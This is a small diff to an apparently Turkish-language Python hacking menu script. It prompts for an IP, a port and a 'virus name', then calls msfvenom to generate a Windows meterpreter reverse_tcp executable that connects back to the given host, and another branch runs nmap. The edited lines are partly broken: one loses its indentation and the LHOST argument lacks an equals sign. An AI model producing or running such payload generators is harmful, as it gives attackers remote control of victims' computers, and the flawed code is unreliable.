@@ -23,10 +23,10 @@ veri=input("----->")
 
 if veri == 1 :
 
-     ip=input("cihaz kimligini giriniz:")
+ip=input("cihaz kimligini giriniz:")
      port=input("portu giriniz:")
      ismin=input("virus ismi:")
-     os.system("clear && msfvenom -p windows/meterpreter/reverse_tcp LHOST"+ip+" LPORT="+port+" -f e                 >
+     os.system("clear && msfvenom -p windows/meterpreter/reverse_tcp LHOST"+ip+" LPORT="+port+" -f exe -o "+ismin)
 
 elif veri == 2 :
      os.system("nmap")
